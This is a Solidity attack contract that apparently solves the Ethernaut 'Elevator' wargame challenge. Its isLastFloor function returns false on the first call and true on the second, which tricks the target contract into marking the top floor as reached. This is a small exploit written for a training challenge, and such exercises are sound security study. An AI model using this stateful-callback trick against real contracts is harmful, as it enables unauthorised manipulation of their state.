// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../src/Elevator.sol';

contract ElevatorScript {
  Elevator target = Elevator(0xf6C5901884E7352D28993f8c310b4a1B34786067);  
  bool button = true;

  function attack() external {
    target.goTo(1);
  }

  function isLastFloor(uint) external returns (bool) {
    if (button) {
      button = false;
      return false;
    } else {
      button = true;
      return true;
    }
  }
}
